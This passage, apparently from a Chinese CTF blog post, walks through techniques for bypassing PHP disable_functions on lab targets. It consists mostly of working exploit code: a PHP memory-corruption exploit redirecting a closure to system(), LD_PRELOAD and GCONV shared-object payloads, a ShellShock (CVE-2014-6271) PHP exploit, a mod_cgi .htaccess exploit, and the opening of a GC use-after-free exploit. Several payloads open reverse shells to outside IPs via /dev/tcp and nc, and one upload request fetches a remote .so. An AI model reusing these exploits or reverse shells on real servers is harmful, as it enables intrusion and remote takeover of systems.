$this-&gt;prepare_leaker();        $binary_leak = $this-&gt;read($helper_handlers + 8);        $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak);        $this-&gt;prepare_cleanup($binary_leak);        $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off + 0x38);        $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr);        $closure_ce = $this-&gt;read($closure_addr + 0x10);        $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);        $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);        $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);        $zif_system = $this-&gt;get_system($basic_funcs);        $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system);        $fake_closure_off = $this-&gt;helper_off + CHUNK_SIZE * 2;        for($i = 0; $i &lt; 0x138; $i += 8) &#123;            $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));        &#125;        $this-&gt;write($fake_closure_off + 0x38, 1, 4);        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;        $this-&gt;write($fake_closure_off + $handler_offset, $zif_system);        $fake_closure_addr = $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off;        $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr);        $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);        $this-&gt;cleanup();        ($this-&gt;helper-&gt;b)(CMD);    &#125;    private function make_uaf_obj() &#123;        $this-&gt;uafp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE));        for($i = 0; $i &lt; STRING_SIZE; $i++) &#123;            fputs($this-&gt;uafp, &quot;\x00&quot;);        &#125;    &#125;    private function prepare_leaker() &#123;        $str_off = $this-&gt;helper_off + CHUNK_SIZE + 8;        $this-&gt;write($str_off, 2);        $this-&gt;write($str_off + 0x10, 6);        $val_off = $this-&gt;helper_off + 0x48;        $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8);        $this-&gt;write($val_off + 8, 0xA);    &#125;    private function prepare_cleanup($binary_leak) &#123;        $ret_gadget = $binary_leak;        do &#123;            --$ret_gadget;        &#125; while($this-&gt;read($ret_gadget, 1) !== 0xC3);        $this-&gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget);        $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));        $this-&gt;write(8, $ret_gadget);    &#125;    private function read($addr, $n = 8) &#123;        $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10);        $value = strlen($this-&gt;helper-&gt;c);        if($n !== 8) &#123; $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;        return $value;    &#125;    private function write($p, $v, $n = 8) &#123;        for($i = 0; $i &lt; $n; $i++) &#123;            $this-&gt;abc[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    private function get_basic_funcs($addr) &#123;        while(true) &#123;            // In rare instances the standard module might lie after the addr we&#39;re starting            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.            // In that case, changing the direction of the search should fix the crash.            // $addr += 0x10;            $addr -= 0x10;            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;                in_array($this-&gt;read($addr + 4, 4),                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) &#123;                $module_name_addr = $this-&gt;read($addr + 0x20);                $module_name = $this-&gt;read($module_name_addr);                if($module_name === 0x647261646e617473) &#123;                    $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr);                    return $this-&gt;read($addr + 0x28);                &#125;            &#125;        &#125;    &#125;    private function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = $this-&gt;read($addr);            $f_name = $this-&gt;read($f_entry, 6);            if($f_name === 0x6d6574737973) &#123;                return $this-&gt;read($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry !== 0);    &#125;    private function cleanup() &#123;        $this-&gt;hfp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;hfp, pack(&#39;QQ&#39;, 0, $this-&gt;abc_addr));        for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i++) &#123;            fputs($this-&gt;hfp, &quot;\x00&quot;);        &#125;    &#125;    private function str2ptr($p = 0, $n = 8) &#123;        $address = 0;        for($j = $n - 1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($this-&gt;abc[$p + $j]);        &#125;        return $address;    &#125;    private function ptr2str($ptr, $n = 8) &#123;        $out = &#39;&#39;;        for ($i = 0; $i &lt; $n; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    private function log($format, $val = &#39;&#39;) &#123;        if(LOGGING) &#123;            printf(&quot;&#123;$format&#125;\n&quot;, $val);        &#125;    &#125;    static function alloc($size) &#123;        return str_shuffle(str_repeat(&#39;A&#39;, $size));    &#125;&#125;------WebKitFormBoundaryj28zfvoWVxnHdp29--</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150034118.png"></p><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//exp2.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/120.76.136.64/2233 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>编译<code>exp2.c</code>为<code>.so</code></p><p><code>gcc exp2.c -o payload.so -shared -fPIC</code></p><blockquote><p><code>-shared</code>创建一个动态链接库，输入文件可以是源文件、汇编文件、目标文件</p><p><code>-fPIC</code> 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</p></blockquote><p>上传so文件</p><pre class="language-shell" data-language="shell"><code class="language-shell">POST &#x2F;uploads&#x2F;318a654260f9e6f122c9bd8b425fe47b.php HTTP&#x2F;1.1Host: 255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Length: 77Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.75 Safari&#x2F;537.36Origin: http:&#x2F;&#x2F;255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Type: application&#x2F;x-www-form-urlencodedAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81&#x2F;uploads&#x2F;318a654260f9e6f122c9bd8b425fe47b.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: __gads&#x3D;ID&#x3D;ff563d10420b0338-2258e7c799ca00cd:T&#x3D;1627650787:RT&#x3D;1627650787:S&#x3D;ALNI_MbFtePzSmcYwzN2fcIiRk_sifUfpAConnection: close1&#x3D;$url &#x3D; &quot;http:&#x2F;&#x2F;xxx.xx.xx.xx&#x2F;aa.so&quot;;$file1 &#x3D; new SplFileObject($url,&#39;r&#39;);$a&#x3D;&quot;&quot;;while(!$file1-&gt;eof())&#123;    $a&#x3D;$a.$file1-&gt;fgets();&#125;$file2 &#x3D; new SplFileObject(&#39;aa.so&#39;,&#39;w&#39;);$file2-&gt;fwrite($a);</code></pre><p>命令执行</p><p><code>1=putenv(&quot;LD_PRELOAD=/var/www/html/uploads/aa.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</code></p><p>如果<code>mail()</code>被禁，可以换成<code>error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;)</code></p><blockquote><p><code>LD_PRELOAD</code>是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p><p><code>putenv()</code>用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在,则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p></blockquote><p><code>mail()</code>函数会执行<code>/usr/sbin/sendmail</code>,<code>LD_PRELOAD</code>可以优先加载链接库，库中重写<code>sendmail</code>影响的函数，这样<code>mail</code>后就会执行我们重写后的函数；如果系统中没有<code>sendmail</code>,<code>GCC</code> 有个 C 语言扩展修饰符<br><code> attribute((constructor))</code>，可以让由它修饰的函数在 <code>main() </code>之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor))<br> 修饰的函数。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">angel</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/120.76.136.64/2233 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><p>编译</p><p>上传<code>.so</code>和<code>gconv-modules</code></p><p>命令执行</p><p><code>1=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code></p><h2 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h2><p>利用bash破壳漏洞（<code>CVE-2014-6271</code>），该漏洞存在于<code>bash 1.14 – 4.3</code>版本中<br><a href="https://www.cnblogs.com/qmfsun/p/7591757.html">https://www.cnblogs.com/qmfsun/p/7591757.html</a></p><p>导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令</p><p><code>putenv(&quot;HACK=() &#123; :; &#125;; /bin/ls&quot;);error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</code><br> 利用的PHP代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token shell-comment comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><span class="token shell-comment comment"># Google Dork: none </span><span class="token shell-comment comment"># Date: 10/31/2014 </span><span class="token shell-comment comment"># Exploit Author: Ryan King (Starfall) </span><span class="token shell-comment comment"># Vendor Homepage: http:</span><span class="token comment">//php.net </span><span class="token shell-comment comment"># Software Link: http:</span><span class="token comment">//php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><span class="token shell-comment comment"># Version: 5.* (tested on 5.6.2) </span><span class="token shell-comment comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><span class="token shell-comment comment"># CVE: CVE-2014-6271 </span><span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PHP_LOL=() &#123; x; &#125;; <span class="token interpolation"><span class="token variable">$cmd</span></span> ><span class="token interpolation"><span class="token variable">$tmp</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// In Safe Mode, the user may only alter environment variableswhose names </span>   <span class="token comment">// begin with the prefixes supplied by this directive. </span>   <span class="token comment">// By default, users will only be able to set environment variablesthat </span>   <span class="token comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>   <span class="token comment">// PHP will let the user modify ANY environment variable! </span>   <span class="token comment">//mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail </span>   <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token double-quoted-string string">"No output, or not vuln."</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>上传运行</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150033034.png"></p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p><code>前置知识</code></p><p><code>.htaccess</code></p><blockquote><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>当AllowOverride被设置为None时。不搜索该目录下的.htaccess文件</p><p>All: 在.htaccess文件中可以使用所有的指令</p><p><code>.htaccess</code>文件中的配置指令作用于<code>.htaccess</code>文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有<code>.htaccess</code>文件，而指令是按查找顺序依次生效的，所以一个特定目录下的<code>.htaccess</code>文件中的指令可能会覆盖其上级目录中的<code>.htaccess</code>文件中的指令，即<code>子目录中的指令会覆盖父目录或者主配置文件中的指令</code>。</p></blockquote><p><code>mod_cgi</code></p><blockquote><p>在非线程型MPM(<code>prefork</code>)上提供对CGI脚本执行的支持</p><p>任何具有MIME类型<code>application/x-httpd-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由<code>AddType</code>指令定义的扩展名，另一种是文件位于<code>ScriptAlias</code>目录中</p></blockquote><p><code>利用条件</code></p><blockquote><p>apache环境</p><p>mod_cgi启用</p><p>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</p><blockquote><p> 在ctfhub这道题中的<code>apache2.conf</code>中是这样的配置，AllowOverride 是None,但有<code>AccessFileName</code></p><p> &lt;Directory /var/www/&gt;<br>     Options Indexes FollowSymLinks<br>     AllowOverride None<br>     Require all granted<br> </Directory></p><p> AccessFileName .htaccess</p></blockquote><p>目录有写权限</p></blockquote><p>蚁剑插件一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150033846.png"></p><p>会自动写入</p><p><code>.htaccess</code></p><blockquote><p>Options +ExecCGI<br>AddHandler cgi-script .ant</p></blockquote><blockquote><p>ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本</p></blockquote><p><code>.htaccess.bak</code></p><blockquote><p>SetEnv HTACCESS on</p></blockquote><p><code>shell.ant</code></p><blockquote><p>#!/bin/sh<br>echo&amp;&amp;cd “/“;/readflag;echo 59dd086;pwd;echo 3530879</p></blockquote><p><code>exp</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"nc -c '/bin/bash' 10.11.12.13 8888"</span><span class="token punctuation">;</span> <span class="token comment">//command to be executed</span><span class="token variable">$shellfile</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"#!/bin/bash\n"</span><span class="token punctuation">;</span> <span class="token comment">//using a shellscript</span><span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span><span class="token punctuation">;</span> <span class="token comment">//header is needed, otherwise a 500 error is thrown when there is output</span><span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$cmd</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">//executing $cmd</span><span class="token keyword">function</span> <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token variable">$condition</span><span class="token punctuation">,</span><span class="token variable">$yes</span><span class="token punctuation">,</span><span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token comment">//this surely can be shorter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$text</span></span>: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$condition</span> <span class="token operator">?</span> <span class="token variable">$yes</span> <span class="token punctuation">:</span> <span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"&lt;br>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'checked'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.htaccess'</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\nSetEnv HTACCESS on"</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: '</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?checked=true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//execute the script again to see if the htaccess test worked</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$modcgi</span> <span class="token operator">=</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'mod_cgi'</span><span class="token punctuation">,</span> <span class="token function">apache_get_modules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// mod_cgi enabled?</span>    <span class="token variable">$writable</span> <span class="token operator">=</span> <span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//current dir writable?</span>    <span class="token variable">$htaccess</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTACCESS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//htaccess enabled?</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Mod-Cgi enabled"</span><span class="token punctuation">,</span><span class="token variable">$modcgi</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Yes"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Is writable"</span><span class="token punctuation">,</span><span class="token variable">$writable</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Yes"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"htaccess working"</span><span class="token punctuation">,</span><span class="token variable">$htaccess</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Yes"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$modcgi</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$writable</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$htaccess</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Error. All of the above must be true for the script to work!"</span><span class="token punctuation">;</span> <span class="token comment">//abort if not</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Backing up .htaccess"</span><span class="token punctuation">,</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess.bak"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Suceeded! Saved in .htaccess.bak"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//make a backup, cause you never know.</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Write .htaccess file"</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.htaccess'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Options +ExecCGI\nAddHandler cgi-script .dizzle"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//.dizzle is a nice extension</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Write shell file"</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.dizzle'</span><span class="token punctuation">,</span><span class="token variable">$shellfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//write the file</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Chmod 777"</span><span class="token punctuation">,</span><span class="token function">chmod</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"shell.dizzle"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//rwx</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'>"</span><span class="token punctuation">;</span> <span class="token comment">//call the script</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p><code>PHP-FPM</code></p><blockquote><p><code>PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)</code>是一个PHPFastCGI管理器，对于PHP 5.3.3之前的php来说，是一个补丁包  ，旨在将FastCGI进程管理整合进PHP包中</p><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p></blockquote><p><a href="https://www.leavesongs.com/penetration/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p><p><a href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true">https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true</a></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150032004.png"></p><p>蚁剑插件一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150032612.png"></p><p>成功的话会在在<code>/tmp</code>目录上传<code>.33997ant_x64.so</code>文件，在<code>/var/www/html</code>中生成<code>.antproxy.php</code>文件，重新以这个文件作为webshell连接，就能bypass了</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150032234.png"></p><h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p>此漏洞利用PHP垃圾收集器（garbage collector）中存在三年的一个 bug，通过PHP垃圾收集器中堆溢出来绕过disable_functions并执行系统命令。</p><p><code>exp.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># Bug: https:</span><span class="token comment">//bugs.php.net/bug.php?id=72530</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># This exploit should work on all PHP 7.0-7.3 versions</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># Author: https:</span><span class="token comment">//github.com/mm0r1</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"uname -a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token 